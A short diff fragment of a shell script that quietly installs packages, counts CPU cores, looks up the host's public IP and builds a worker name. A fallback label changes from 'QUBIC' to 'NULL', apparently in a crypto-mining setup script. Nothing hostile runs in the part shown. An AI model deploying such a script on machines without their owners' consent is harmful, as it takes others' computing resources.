@@ -14,7 +14,7 @@ sudo apt -qqy install wget nload icu-devtools >/dev/null 2>&1 || apt -qqy instal
 cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
 [ -n "$cores" ] || cores=1
 addr=`wget --no-check-certificate -4 -qO- http://checkip.amazonaws.com/ 2>/dev/null`
-[ -n "$addr" ] || addr="QUBIC"
+[ -n "$addr" ] || addr="NULL"
 rand=`RandString 3`
 [ -n "$rand" ] && rand="_${rand}" || rand=""
 name="${addr}_${cores}${rand}"
